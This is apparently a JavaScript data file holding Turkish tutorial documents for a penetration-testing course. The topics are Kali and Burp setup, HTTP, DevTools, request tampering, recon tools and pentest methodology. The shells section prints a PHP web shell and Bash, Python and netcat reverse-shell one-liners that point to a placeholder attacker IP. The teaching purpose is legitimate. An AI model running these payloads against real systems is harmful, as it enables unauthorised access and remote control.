/* ===========================================================================
   siberkampus — Learning Pathway Documents (Öğrenme Yolları Rehberleri)
   =========================================================================== */

const SK_DOCS = {
  'doc-kali-setup': {
    title: 'Kali Linux & Burp Suite Kurulumu',
    readTime: '~15 dk okuma',
    tagline: 'Pentest araçlarını kur, proxy ayarla, ilk isteğini yakala.',
    intro: 'Siber güvenlik operasyonlarına başlamadan önce kendi laboratuvar ortamımızı hazırlamamız gerekir. Bu dökümanda siber güvenlik dünyasının en popüler işletim sistemi olan Kali Linux ve web pentestlerinin olmazsa olmaz aracı Burp Suite’in kurulumlarını adım adım inceleyeceğiz.',
    sections: [
      {
        icon: '🖥️',
        h: 'Kali Linux Nedir ve VM Kurulumu',
        body: [
          'Kali Linux, siber güvenlik uzmanları, sızma testi (pentest) uzmanları ve adli bilişim araştırmacıları için özel olarak geliştirilmiş Debian tabanlı bir Linux dağıtımıdır. İçerisinde siber güvenlik araştırmalarında sıklıkla kullanılan 600\'den fazla önceden kurulmuş araç barındırır.',
          'Kali Linux\'u kendi bilgisayarımızda ana işletim sistemi olarak kurmak yerine, yalıtılmış bir sanal makinede (Virtual Machine) çalıştırmak en güvenli ve yaygın yöntemdir. Bunun için Oracle VirtualBox veya VMware Workstation Player yazılımlarından birini indirin.',
          'Ardından kali.org/get-kali adresine giderek "Virtual Machines" sekmesinden kullandığınız sanallaştırma programına uygun hazır VM imajını (.ova veya .vmx formatında) indirin ve sanallaştırma programınızda "Open" veya "Import" diyerek açın. Varsayılan kullanıcı adı "kali" ve şifresi de "kali"dir.'
        ]
      },
      {
        icon: '🔧',
        h: 'Burp Suite Kurulumu ve Yapılandırma',
        body: [
          'Burp Suite, web uygulamalarının güvenlik analizleri ve sızma testleri için geliştirilmiş, dünya çapında standart kabul edilen bir web proxy (vekil sunucu) platformudur. Tarayıcınız ile hedef sunucu arasındaki trafiği araya girerek (Man-in-the-Middle) yakalamanızı, okumanızı ve manipüle etmenizi sağlar.',
          'Kali Linux işletim sisteminde Burp Suite Community Edition hazır kurulu olarak gelir. Uygulama menüsünden veya terminale "burpsuite" yazarak başlatabilirsiniz. İlk açılış ekranında "Temporary project" ve ardından "Use Burp defaults" seçenekleriyle devam ederek ana arayüze ulaşabilirsiniz.'
        ]
      },
      {
        icon: '⚙️',
        h: 'Tarayıcı Proxy Ayarları (Firefox & FoxyProxy)',
        body: [
          'Tarayıcınızın trafiğini Burp Suite üzerinden geçirmek için tarayıcınızın proxy ayarlarını yapmalısınız. Firefox tarayıcısının sağ üstündeki menüden Ayarlar -> Genel sayfasının en altındaki Ağ Ayarları (Network Settings) bölümüne gidin.',
          'Burada "Manuel Proxy Yapılandırması" (Manual Proxy Configuration) seçeneğini işaretleyin. HTTP Proxy alanına "127.0.0.1" (yani kendi bilgisayarınız/localhost) ve Port alanına "8080" yazın. "Tüm protokoller için bu proxy\'yi kullan" kutusunu işaretleyip kaydedin.',
          'Bu işlemi daha pratik hale getirmek için Firefox eklenti mağazasından "FoxyProxy Standard" eklentisini kurabilirsiniz. FoxyProxy ayarlarına girip 127.0.0.1 IP adresi ve 8080 portuna sahip "Burp" adlı bir profil oluşturarak, proxy trafiğini tek bir tıkla açıp kapatabilirsiniz.'
        ]
      },
      {
        icon: '🔑',
        h: 'CA Sertifikası İçe Aktarma (HTTPS Trafiği İçin)',
        body: [
          'Modern web sitelerinin neredeyse tamamı şifreli HTTPS protokolünü kullanır. Tarayıcınız proxy açıkken bir HTTPS sitesine gitmek istediğinde, aradaki trafiği çözmeye çalışan Burp Suite\'i bir saldırgan olarak algılayacak ve bağlantıyı güvenlik hatası nedeniyle engelleyecektir. Bunu aşmak için Burp\'ün CA (Certificate Authority) sertifikasını tarayıcımıza güvenilir olarak eklemeliyiz.',
          'Proxy\'yi açın ve tarayıcınızdan http://burp adresine gidin. Sağ üst köşedeki "CA Certificate" butonuna tıklayarak "cacert.der" isimli sertifika dosyasını bilgisayarınıza indirin.',
          'Firefox Ayarlar menüsünden Gizlilik ve Güvenlik sekmesine gelin, sayfanın altındaki Sertifikalar -> Sertifikaları Göster (View Certificates) butonuna tıklayın. Açılan pencerede "Yetkililer" (Authorities) sekmesindeyken "İçe Aktar" (Import) deyin ve indirdiğiniz cacert.der dosyasını seçin. Çıkan onay kutusunda "Bu CA web sitelerini tanımlamak için güvensin" (Trust this CA to identify websites) seçeneğini işaretleyip Tamam diyerek kaydedin. Tarayıcınızı kapatıp açtığınızda artık HTTPS sitelerin trafiğini de sorunsuz izleyebilirsiniz.'
        ]
      },
      {
        icon: '📡',
        h: 'İlk HTTP İsteğini Yakalama',
        body: [
          'Her şey hazır olduğuna göre test edebiliriz. Burp Suite\'e dönün ve "Proxy" -> "Intercept" sekmesinde yer alan "Intercept is on" (Yakalama Açık) butonunun aktif olduğundan emin olun.',
          'Tarayıcınızdan target1.siberkampus.org adresine gidin. Tarayıcının yükleniyor durumunda beklediğini ve sayfanın açılmadığını göreceksiniz. Bunun sebebi isteğin sunucuya gitmeden önce Burp Suite tarafından havada yakalanmış olmasıdır.',
          'Burp Suite ekranında isteği (GET isteği, headerlar, cookie bilgileri vb.) detaylıca görebilirsiniz. "Forward" butonuna bastığınızda istek sunucuya iletilir ve web sayfası tarayıcınızda yüklenir. Tebrikler, ilk ağ trafiğinizi başarıyla yakaladınız!'
        ]
      }
    ],
    closing: 'Laboratuvar ortamınızı başarıyla kurdunuz. Artık kendi tarayıcınızdan gönderdiğiniz tüm paketleri inceleyebilir ve sunucuların size verdiği cevapları görebilirsiniz. Bir sonraki adımda, siber güvenlikte en çok konuşulan protokol olan HTTP\'nin çalışma yapısını inceleyeceğiz.'
  },
  'doc-http-basics': {
    title: 'HTTP Protokolü & Web Mimarisi',
    readTime: '12 dk okuma',
    tagline: 'Web\'in çalışma mantığını, istek/yanıt döngülerini ve başlıkları anla.',
    intro: 'Web güvenliğini öğrenmek için öncelikle web sitelerinin tarayıcımızla nasıl iletişim kurduğunu çok iyi kavramamız gerekir. HTTP (HyperText Transfer Protocol), internetin temel iletişim dilidir ve tüm web pentest süreçlerinde analiz edeceğimiz ana hedeftir.',
    sections: [
      {
        icon: '🌐',
        h: 'İstemci - Sunucu Mimarisi',
        body: [
          'Web, İstemci (Client) ve Sunucu (Server) ilişkisine dayanır. İstemci (tarayıcınız), bir web sayfasını görüntülemek isteyen taraftır. Sunucu ise bu web sayfasının dosyalarını barındıran ve gelen isteklere yanıt veren güçlü bir bilgisayardır.',
          'HTTP, bu iki tarafın birbiriyle nasıl konuşacağını belirleyen kurallar bütünüdür. HTTP "stateless" (durumsuz) bir protokoldür; yani sunucu her isteği bağımsız bir işlem olarak görür ve bir önceki isteği hatırlamaz. Bu durumu aşmak için Cookie ve Session mekanizmaları kullanılır.'
        ]
      },
      {
        icon: '📩',
        h: 'HTTP Request (İstek) Yapısı',
        body: [
          'Tarayıcınız sunucuya bir istek gönderdiğinde bu istek belirli bölümlerden oluşur:',
          '1. HTTP Metodu (Method): Sunucuya ne yapmak istediğimizi söyler. En yaygın metodlar şunlardır:',
          '- GET: Sunucudan veri çekmek/sayfa görüntülemek için kullanılır. Gönderilen veriler URL parametresinde taşınır.',
          '- POST: Sunucuya veri göndermek için kullanılır (örn: giriş formu, dosya yükleme). Veriler isteğin gövdesinde (Body) taşınır, URL\'de görünmez.',
          '- PUT / DELETE: Sunucudaki bir veriyi güncellemek veya silmek için kullanılır.',
          '2. Request URL/Path: İstekte bulunulan sayfa yolu (örn: /index.html).',
          '3. Headers (Başlıklar): İstekle ilgili ek bilgileri taşır. Örneğin: "User-Agent" tarayıcı bilginizi, "Cookie" oturum anahtarınızı, "Host" ise bağlanılacak alan adını sunucuya bildirir.',
          '4. Body (Gövde): POST isteklerinde sunucuya gönderilen ham veriyi barındırır (kullanıcı adı, şifre vb.).'
        ]
      },
      {
        icon: '📤',
        h: 'HTTP Response (Yanıt) Yapısı',
        body: [
          'Sunucu isteğimizi aldıktan sonra bize bir HTTP Yanıtı (Response) döner. Bu yanıt şu bileşenlerden oluşur:',
          '1. HTTP Durum Kodu (Status Code): Sunucunun işlemin sonucunu bildiren 3 haneli sayı kodlarıdır:',
          '- 2xx (Başarı): Örn: 200 OK (İşlem başarılı).',
          '- 3xx (Yönlendirme): Örn: 301/302 (Sayfa başka bir adrese taşındı/yönlendirildi).',
          '- 4xx (İstemci Hatası): Örn: 404 Not Found (Sayfa bulunamadı) veya 403 Forbidden (Erişim yetkiniz yok).',
          '- 5xx (Sunucu Hatası): Örn: 500 Internal Server Error (Sunucu tarafında kod hatası oluştu).',
          '2. Headers: Sunucu hakkında ek bilgileri taşır. Örneğin: "Server" sunucu yazılımını (Nginx, Apache), "Set-Cookie" tarayıcımıza kaydedilecek oturum çerezini tanımlar.',
          '3. Body: Sayfanın HTML, CSS veya resim dosyalarından oluşan görsel içeriğidir.'
        ]
      },
      {
        icon: '🍪',
        h: 'Çerezler (Cookies) ve Oturum Yönetimi',
        body: [
          'HTTP durumsuz olduğu için, giriş yaptıktan sonra her sayfada şifremizi tekrar girmemek için çerezler kullanılır.',
          'Giriş formu başarıyla doğrulandığında sunucu, yanıtta "Set-Cookie: session_id=xyz123" başlığıyla tarayıcımıza benzersiz bir anahtar kaydeder.',
          'Tarayıcımız, o sitede dolaşırken gönderdiği her yeni isteğin "Cookie" başlığına bu session_id anahtarını otomatik ekler. Sunucu gelen anahtarı kontrol ederek kim olduğumuzdan emin olur. Bu anahtarlar siber saldırganlar için en değerli hedeflerden biridir.'
        ]
      }
    ],
    closing: 'HTTP istek ve yanıtlarının anatomisini kavradınız. Artık web sitelerinin arkasındaki ham veriyi okuyabilir ve analiz edebilirsiniz. Bir sonraki adımda, tarayıcımızın içinde gizli olan en güçlü araç setini, yani Geliştirici Araçlarını (DevTools) keşfedeceğiz.'
  },
  'doc-devtools': {
    title: 'Tarayıcı DevTools Kullanımı',
    readTime: '8 dk okuma',
    tagline: 'Tarayıcının geliştirici araçlarıyla web sayfalarının arka planını keşfet.',
    intro: 'Tüm modern web tarayıcılarında web geliştiricileri için entegre edilmiş güçlü araç setleri bulunur. DevTools (Developer Tools) olarak adlandırılan bu paneller, siber güvenlik uzmanlarının da web uygulamalarını analiz etmek, zafiyetleri test etmek ve anlık manipülasyonlar yapmak için kullandığı ilk duraktır.',
    sections: [
      {
        icon: '🛠️',
        h: 'DevTools Arayüzüne Giriş',
        body: [
          'Geliştirici araçlarını açmak oldukça basittir. Tarayıcınız açıkken sayfadaki herhangi bir öğeye sağ tıklayıp "İncele" (Inspect) diyebilir veya klavyenizden "F12" tuşuna basabilirsiniz.',
          'DevTools ekranı genellikle sayfanın sağında veya altında açılır. Arayüzün en üstünde farklı analiz amaçlarına hizmet eden sekmeler yer alır. Biz siber güvenlik perspektifinden en çok "Elements", "Console", "Network" ve "Application" sekmelerini kullanacağız.'
        ]
      },
      {
        icon: '🖥️',
        h: 'Elements (Ögeler) Tabı',
        body: [
          'Elements sekmesi, web sayfasının o anki canlı HTML iskeletini ve CSS tasarım kurallarını gösterir.',
          'Burada yer alan HTML kodlarını çift tıklayarak anında değiştirebilir, silebilir veya yeni etiketler ekleyebilirsiniz. Bu değişiklikler sadece sizin tarayıcınızda geçerli olur (istemci tarafı), sunucudaki kodlar değişmez.',
          'Siber güvenlik testlerinde, kısıtlanmış HTML form elemanlarındaki limitleri kaldırmak (örneğin maksimum karakter sınırını aşmak), gizli form alanlarını görünür yapmak veya sayfaya test amaçlı XSS kodları yerleştirmek için Elements sekmesini sıklıkla kullanırız.'
        ]
      },
      {
        icon: '💻',
        h: 'Console (Konsol) Tabı',
        body: [
          'Console sekmesi, web sayfasının arka planında doğrudan JavaScript kodları çalıştırmanızı sağlayan etkileşimli bir terminaldir.',
          'Console\'a yazıp enter\'a bastığınız her JavaScript kodu sayfa üzerinde anında yürütülür. Örneğin, `alert(document.cookie)` yazarak tarayıcınızın o site için sakladığı çerezleri anlık bir pop-up ile ekrana getirebilirsiniz.',
          'Ayrıca web sitesinde oluşan JavaScript hataları ve geliştiricilerin bıraktığı konsol günlükleri (console.log) de burada listelenir. Bu günlükler bazen hassas api adreslerini veya sistem bilgilerini sızdırabilir.'
        ]
      },
      {
        icon: '📡',
        h: 'Network (Ağ) Tabı',
        body: [
          'Network sekmesi, sayfa yüklendikten sonra veya sayfada bir butona bastığınızda tarayıcının sunucuya gönderdiği tüm arka plan isteklerini (API çağrıları, resim yüklemeleri, CSS dosyaları vb.) listeler.',
          'Burada listelenen herhangi bir isteğe tıkladığınızda: isteğin hangi URL\'ye gittiğini, HTTP metodunu, gönderilen verileri (Request headers/body) ve sunucunun döndüğü cevabı (Response headers/body) ham veya düzenli formatta görebilirsiniz.',
          'Giriş yaparken şifremizin nereye gittiğini, sayfada bir veri güncellenirken arka planda hangi parametrelerin taşındığını analiz etmek için Network sekmesi hayati öneme sahiptir.'
        ]
      },
      {
        icon: '💾',
        h: 'Application / Storage Tabı',
        body: [
          'Bu sekme, tarayıcınızın o web sitesi için yerel olarak sakladığı tüm verileri depolama türlerine göre listeler.',
          'Sol taraftaki menüden "Cookies" sekmesine girdiğinizde, sitenin tanımladığı çerezlerin isimlerini, değerlerini ve güvenlik parametrelerini (HttpOnly, Secure vb.) görebilir ve değerlerini çift tıklayarak manipüle edebilirsiniz.',
          'Aynı şekilde HTML5 ile gelen "Local Storage" ve "Session Storage" depolama alanları da burada yer alır. Geliştiriciler bazen güvensiz şekilde kullanıcı yetkilerini veya hassas jetonları (JWT) bu alanlarda saklarlar.'
        ]
      }
    ],
    closing: 'Tarayıcınızın içindeki bu güçlü araç seti ile web sitelerinin arka planını incelemeyi öğrendiniz. Artık bir web sayfasının ham kodlarına ve depoladığı çerezlere tam olarak hakimsiniz. Bir sonraki aşamada, trafiği daha gelişmiş manipüle etmek için Burp Suite Proxy sistemini detaylandıracağız.'
  },
  'doc-burp-proxy': {
    title: 'Burp Suite Proxy ile İstek Manipülasyonu',
    readTime: '10 dk okuma',
    tagline: 'Intercept ve Repeater kullanarak verileri havada değiştir.',
    intro: 'Tarayıcımızın geliştirici araçları anlık inceleme için harikadır, ancak sunucuya giden istekleri havada yakalayıp, sunucu ruhu bile duymadan parametreleri değiştirmek ve karmaşık testler gerçekleştirmek için profesyonel bir araca ihtiyaç duyarız. İşte bu noktada Burp Suite’in kalbi olan Proxy ve Repeater devreye girer.',
    sections: [
      {
        icon: '🔄',
        h: 'Proxy Intercept (İstek Yakalama ve Manipülasyon)',
        body: [
          'Burp Suite Proxy sekmesindeki "Intercept" özelliği, tarayıcınızın sunucuya göndermek üzere yola çıkardığı HTTP paketini havada durdurur.',
          'Paket havada asılıyken üzerinde istediğiniz değişikliği yapabilirsiniz. Örneğin, bir alışveriş sitesinde sepetteki ürünün adet fiyatını gösteren "price=100" parametresini "price=1" olarak değiştirip sunucuya gönderebilirsiniz. Eğer sunucu taraflı bir kontrol yoksa, sunucu bu isteği işleyerek ürünü 1 TL\'ye satacaktır.',
          'İsteği düzenledikten sonra "Forward" butonuyla yola devam ettirebilir, "Drop" butonuyla isteği tamamen iptal edebilirsiniz.'
        ]
      },
      {
        icon: '🔁',
        h: 'Repeater Modülü (Tekrarlayıcı)',
        body: [
          'Bir web sayfasında aynı parametreyi 20 kere farklı değerlerle test etmek istediğinizi düşünün. Her seferinde tarayıcıdan form doldurup Burp\'te yakalamak çok yorucu olacaktır. Bunun yerine, yakaladığınız isteğe sağ tıklayıp "Send to Repeater" (Ctrl+R) diyerek isteği Repeater modülüne aktarabilirsiniz.',
          'Repeater, isteğin bir kopyasını saklar. Sol taraftaki alanda parametreleri istediğiniz gibi değiştirip "Send" butonuna bastığınızda, isteği sunucuya gönderir ve sunucunun verdiği yanıtı anında sağ taraftaki panelde gösterir.',
          'Bu işlem tarayıcıyı hiç yormadan, tamamen arka planda gerçekleşir ve sızma testlerinde zafiyet analizi yaparken en çok zaman geçireceğiniz alandır.'
        ]
      },
      {
        icon: '🎯',
        h: 'Target Sekmesi ve Scope (Kapsam) Belirleme',
        body: [
          'Proxy açıkken internette gezindiğinizde, Burp Suite arka planda giden yüzlerce farklı reklam ve analiz isteğini de yakalayacaktır. Bu durum ana hedefe odaklanmanızı zorlaştırır.',
          '"Target" -> "Site map" sekmesinde, ziyaret ettiğiniz tüm sitelerin ağaç yapısını görebilirsiniz. Kendi hedef sitenize (örn: target1.siberkampus.org) sağ tıklayıp "Add to scope" seçeneğini seçerek, Burp Suite\'e yalnızca bu hedefle ilgili istekleri göstermesini söyleyebilirsiniz.',
          'Ardından Proxy -> Intercept -> Action menüsünden yalnızca scope içindeki isteklerin yakalanmasını sağlayacak filtreleri aktif edebilirsiniz.'
        ]
      },
      {
        icon: '⚙️',
        h: 'Decoder & Comparer Yardımcı Araçları',
        body: [
          'Web isteklerindeki veriler genellikle Base64, URL Encode veya Hex gibi formatlarda şifrelenir/kodlanır. Burp içindeki "Decoder" aracı sayesinde bu verileri tarayıcıdan çıkmadan anında decode edip okuyabilir veya kendi payload\'larınızı encode edebilirsiniz.',
          '"Comparer" aracı ise, sunucudan dönen iki farklı yanıtı (örneğin doğru şifre girildiğindeki yanıt ile yanlış şifre girildiğindeki yanıt) yan yana koyarak aralarındaki karakter ve boyut farklarını görsel olarak karşılaştırmanızı sağlar.'
        ]
      }
    ],
    closing: 'Burp Suite\'in en kritik iki silahını (Intercept ve Repeater) öğrendiniz. Web isteklerini havada manipüle etme yeteneği, web hacking dünyasının temel anahtarıdır. Bir sonraki aşamada, sunucu üzerinde kalıcı kontrol sağlamak için Web Shell ve Reverse Shell kavramlarını inceleyeceğiz.'
  },
  'doc-shells': {
    title: 'Web Shell & Reverse Shell Temelleri',
    readTime: '10 dk okuma',
    tagline: 'Hedef sistemde komut çalıştırma ve bağlantıyı kendi makinene yönlendirme.',
    intro: 'Bir web uygulamasında dosya yükleme zafiyeti (File Upload) veya komut enjeksiyonu (Command Injection) bulduktan sonraki amacımız, sistem üzerinde kalıcı ve rahat hareket edebileceğimiz bir komut satırı erişimi elde etmektir. Bunun için Web Shell ve Reverse Shell teknikleri kullanılır.',
    sections: [
      {
        icon: '🐚',
        h: 'Shell Nedir? Bind vs Reverse Shell',
        body: [
          'Siber güvenlikte "Shell", hedef bilgisayarın işletim sistemine uzaktan komut gönderebildiğimiz komut satırı bağlantısıdır. İki tür bağlantı modeli vardır:',
          '1. Bind Shell: Hedef sunucu kendi üzerinde belirli bir portu (örneğin 4444) dışarıya açar ve bir terminal bağlar. Saldırgan bu porta bağlanarak komut çalıştırır. Dezavantajı: Hedef sunucunun güvenlik duvarı (Firewall) dışarıdan gelen bu bağlantıyı yüksek ihtimalle engeller.',
          '2. Reverse Shell (Ters Shell): Saldırgan kendi makinesinde bir portu dinlemeye alır. Hedef sunucuda çalıştırılan bir kod, saldırganın IP adresine doğru giden bir bağlantı başlatır ve kendi terminalini saldırgana teslim eder. Avantajı: Güvenlik duvarları genellikle dışarıdan gelen istekleri engellerken, içeriden dışarıya giden (egress) isteklere izin verir. Bu yüzden sızma testlerinde 99% oranında Reverse Shell tercih edilir.'
        ]
      },
      {
        icon: '📂',
        h: 'Web Shell Nedir?',
        body: [
          'Web Shell, hedef sunucunun desteklediği bir web dilinde (PHP, ASPX, JSP vb.) yazılmış, tarayıcı üzerinden sunucuda komut çalıştırmamıza veya dosyaları yönetmemize olanak tanıyan tek dosyalık arka kapılardır (Backdoor).',
          'Örneğin en basit PHP web shell kodu şudur:',
          '`<?php system($_GET["cmd"]); ?>`',
          'Eğer bu dosyayı sunucuya "shell.php" adıyla yüklemeyi başarırsak, tarayıcımızdan şu adrese giderek sunucuda komut çalıştırabiliriz:',
          '`http://hedef.com/uploads/shell.php?cmd=whoami`',
          'Sunucu bu isteği aldığında "whoami" komutunu çalıştıracak ve çıktıyı tarayıcı ekranımıza yazacaktır.'
        ]
      },
      {
        icon: '📞',
        h: 'Netcat (nc) ile Listener (Dinleyici) Kurma',
        body: [
          'Reverse shell alabilmek için öncelikle kendi bilgisayarımızda (saldırgan makinesinde) giden bağlantıyı yakalayacak bir dinleyici kurmalıyız. Bunun için ağ dünyasının İsviçre çakısı olarak bilinen "Netcat" (nc) aracını kullanırız.',
          'Terminalde şu komutla dinleyiciyi başlatabilirsiniz:',
          '`nc -lvnp 4444`',
          '- `l` (Listen): Dinleme moduna geç.',
          '- `v` (Verbose): Detaylı bilgi yazdır (bağlantı geldiğinde uyar).',
          '- `n` (Numeric): DNS çözümlemesi yapma, doğrudan IP kullan (hızlandırır).',
          '- `p` (Port): Dinlenecek port numarasını belirt (örneğin 4444).'
        ]
      },
      {
        icon: '💻',
        h: 'Reverse Shell Payload Seçenekleri',
        body: [
          'Dinleyiciyi kurduktan sonra, hedef sunucuda bizim bilgisayarımıza geri bağlantı kuracak bir komut (payload) çalıştırmalıyız. İşletim sistemine ve yüklü dillere göre seçebileceğimiz popüler one-liner payloadlar şunlardır:',
          '- Bash Reverse Shell:',
          '`bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1`',
          '- Python Reverse Shell:',
          '`python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("SALDIRGAN_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'`',
          '- Netcat Reverse Shell (Eğer nc -e parametresini destekliyorsa):',
          '`nc -e /bin/bash SALDIRGAN_IP 4444`',
          'Bu komutlardan biri hedefte çalıştığı an, Netcat ekranımızda hedefin terminal satırı belirecektir.'
        ]
      }
    ],
    closing: 'Web Shell ve Reverse Shell mekanizmalarını öğrendiniz. Hedef sunucuda komut koşturup terminal bağlantısı almak, sızma testinin en heyecan verici aşamasıdır. Bir sonraki dökümanda, tüm bu adımları belirli bir standartta yönetmemizi sağlayan Pentest Metodolojisini ve raporlama prensiplerini ele alacağız.'
  },
  'doc-pentest-methodology': {
    title: 'Pentest Metodolojisi & Raporlama',
    readTime: '15 dk okuma',
    tagline: 'Sızma testlerini standartlara uygun planla ve profesyonelce raporla.',
    intro: 'Siber güvenlik sadece sistemleri hacklemekten ibaret değildir. Profesyonel bir sızma testi (pentest) uzmanı, yaptığı işlemleri uluslararası standartlara uygun bir metodolojiyle yürütmeli ve bulgularını müşterinin anlayacağı teknik ve idari dille raporlayabilmelidir. Rapor, bir pentest projesinin yegane ürünüdür.',
    sections: [
      {
        icon: '🗺️',
        h: 'Sızma Testi Aşamaları (Metodoloji)',
        body: [
          'Profesyonel bir sızma testi projesi 5 ana aşamadan oluşur:',
          '1. Planlama ve Kapsam Belirleme (Scoping): Hangi sistemlerin taranacağı, testin türü (Black, Grey veya White Box) ve kuralları belirlenir.',
          '2. Bilgi Toplama ve Keşif (Reconnaissance): Hedef sistemler hakkında ip uçları, IP adresleri, açık portlar ve çalışan servisler toplanır.',
          '3. Zafiyet Analizi (Vulnerability Analysis): Toplanan bilgiler ışığında sistemlerdeki olası açıklar otomatik tarayıcılar ve manuel kontrollerle tespit edilir.',
          '4. Istismar (Exploitation): Tespit edilen açıklar kullanılarak sisteme yetkisiz erişim sağlanır.',
          '5. Yetki Yükseltme ve Kalıcılık (Post-Exploitation): Sistemde root/admin yetkilerine geçilmeye çalışılır ve test süresince erişimi kaybetmemek için kalıcılık adımları uygulanır.'
        ]
      },
      {
        icon: '🛡️',
        h: 'OWASP ve Penetrasyon Testi Standartları',
        body: [
          'Sızma testlerinin kalitesini korumak için bazı uluslararası çerçeveler (frameworks) kullanılır:',
          '- OWASP (Open Web Application Security Project): Web uygulaması güvenliğinde dünya standardıdır. En yaygın 10 zafiyeti listeleyen "OWASP Top 10" ve test adımlarını içeren "OWASP Testing Guide" (WSTG) dökümanları başucu kaynaklarımızdır.',
          '- PTES (Penetration Testing Execution Standard): Bir sızma testinin başından sonuna kadar nasıl icra edilmesi gerektiğini tanımlayan kapsamlı bir standarttır.'
        ]
      },
      {
        icon: '🔍',
        h: 'Rapor Yazma ve CVSS Puanlama',
        body: [
          'Müşteriye sunulan rapor iki ana bölümden oluşmalıdır:',
          '1. Yönetici Özeti (Executive Summary): Teknik jargon içermeyen, şirketin genel güvenlik durumunu ve iş risklerini açıklayan, üst düzey yöneticilere hitap eden bölüm.',
          '2. Teknik Detaylar (Technical Findings): Güvenlik ekiplerinin açıkları kapatabilmesi için zafiyetin tanımı, etkisi, sömürü adımları (Proof of Concept - PoC) ve çözüm önerilerinin yer aldığı detaylı bölüm.',
          'Zafiyetlerin ciddiyet seviyesini belirlemek için CVSS (Common Vulnerability Scoring System) kullanılır. CVSS zafiyetleri 0.0 ile 10.0 arasında puanlar: Düşük (Low), Orta (Medium), Yüksek (High) ve Kritik (Critical).'
        ]
      },
      {
        icon: '⚠️',
        h: 'Cleanup (Ortam Temizliği) Aşaması',
        body: [
          'Test işlemleri tamamlandıktan sonra, hedef sistemlerde bırakılan tüm izlerin temizlenmesi yasal ve etik bir zorunluluktur.',
          'Sunucuya yüklenen Web Shell dosyaları silinmeli, oluşturulan geçici kullanıcı hesapları kapatılmalı, güvenlik duvarında açılan geçici izinler geri alınmalıdır. Aksi takdirde, arkamızda bıraktığımız bu zayıflıklar gerçek saldırganlar tarafından kullanılabilir.'
        ]
      }
    ],
    closing: 'Pentest metodolojisi ve raporlama standartlarını öğrendiniz. Artık teknik bilginizi profesyonel bir siber güvenlik hizmetine dönüştürmek için gereken kuramsal çerçeveye sahipsiniz. Bir sonraki rehberde, keşif aşamasında hayat kurtaran otomatik araçların (Nmap, Gobuster) kullanımını inceleyeceğiz.'
  },
  'doc-recon-tools': {
    title: 'Keşif Araçları (Nmap, Dirb, Gobuster)',
    readTime: '12 dk okuma',
    tagline: 'Hedef sistemdeki açık portları ve gizli dizinleri otomatik keşfet.',
    intro: 'Bir web pentest operasyonunda hedef web sitesinin sadece bize gösterilen sayfalarından ibaret olmadığını biliriz. Sunucuda açık bırakılmış başka portlar, sitenin altında gizlenmiş yedek dosyaları (.zip, .bak), admin panelleri veya unutulmuş test dizinleri olabilir. Bu saklı alanları keşfetmek için otomatik tarama araçları kullanırız.',
    sections: [
      {
        icon: '🛰️',
        h: 'Nmap ile Aktif Port Tarama',
        body: [
          'Nmap (Network Mapper), hedef sunucunun ağ üzerindeki haritasını çıkaran en popüler araçtır. Sunucudaki 65535 portu tek tek tarayarak hangilerinin açık olduğunu ve üzerinde hangi servislerin (Apache, OpenSSH vb.) çalıştığını tespit eder.',
          'Sıklıkla kullanılan temel Nmap tarama komutları:',
          '- Hızlı Port Taraması: `nmap -F hedef_ip` (En yaygın 100 portu tarar)',
          '- Servis Versiyon Tespiti: `nmap -sV hedef_ip` (Açık portlardaki servislerin sürüm bilgisini okur)',
          '- Detaylı / Agresif Tarama: `nmap -A hedef_ip` (İşletim sistemi tespiti, sürüm tespiti ve varsayılan betik taramalarını birlikte yapar)'
        ]
      },
      {
        icon: '📂',
        h: 'Dizin Brute-Force (Kaba Kuvvet) Nedir?',
        body: [
          'Web sunucuları, URL\'den gelen yollara göre dosya sunarlar. Ancak sunucuda bulunan her dizin site haritasında veya menülerde link olarak yer almaz. Örneğin `/admin`, `/backup`, `/test.php` veya `/secret` gibi yollar gizlenmiş olabilir.',
          'Bu gizli yolları bulmak için "Dizin Brute-Force" tekniği uygulanır. Bilgisayarımızdaki binlerce popüler dizin adından oluşan bir kelime listesi (Wordlist), hedef web sitesine hızlıca istek olarak gönderilir (örn: site.com/admin, site.com/login vb.). Sunucunun döndüğü HTTP durum koduna göre (örneğin 200 veya 403 dönerse o dizin vardır, 404 dönerse yoktur) dizinler haritalandırılır.'
        ]
      },
      {
        icon: '🚀',
        h: 'Gobuster ve Dirb Kullanımı',
        body: [
          'Dizin brute-force işlemini en hızlı yapan iki popüler araç Gobuster ve Dirb\'tir. Gobuster, Go diliyle yazıldığı için çok hızlı ve paralel istek atabilen bir araçtır.',
          '- Gobuster ile Dizin Taraması:',
          '`gobuster dir -u http://target1.siberkampus.org -w /usr/share/wordlists/dirb/common.txt`',
          '- `-u` (URL): Taranacak hedef web sitesi.',
          '- `-w` (Wordlist): Kullanılacak kelime listesinin dosya yolu.',
          'Ayrıca Gobuster\'a `-x php,txt,html` parametresini ekleyerek, sadece dizinleri değil, belirli uzantılara sahip gizli dosyaları da arayabilirsiniz.',
          'Dirb ise yerleşik gelen, kendi hazır kelime listeleriyle hızlıca tarama başlatan klasik bir dizin tarayıcı aracıdır: `dirb http://target1.siberkampus.org` yazarak doğrudan başlatabilirsiniz.'
        ]
      },
      {
        icon: '🔍',
        h: 'Nikto Web Zafiyet Taraması',
        body: [
          'Keşif aşamasının son adımlarından biri, hedef sunucuda bilinen bariz yanlış yapılandırmaları ve eski sürüm açıklarını tarayan Nikto aracını kullanmaktır.',
          'Nikto, sunucu başlıklarını, gizli dosyaları ve 6500\'den fazla bilinen zafiyet kalıbını test eder: `nikto -h http://target1.siberkampus.org` komutuyla hızlı bir tarama gerçekleştirebilirsiniz.'
        ]
      }
    ],
    closing: 'Port tarama ve dizin kaba kuvvet araçlarını öğrendiniz. Otomatik keşif araçları, hedef sistem üzerindeki saldırı yüzeyini genişleterek girmek için en uygun kapıyı seçmenizi kolaylaştırır. Artık öğrendiğiniz tüm bu teorik ve pratik bilgileri canlı hedef siteler üzerinde uygulama aşamasına hazırsınız!'
  }
};

Object.assign(window, { SK_DOCS });
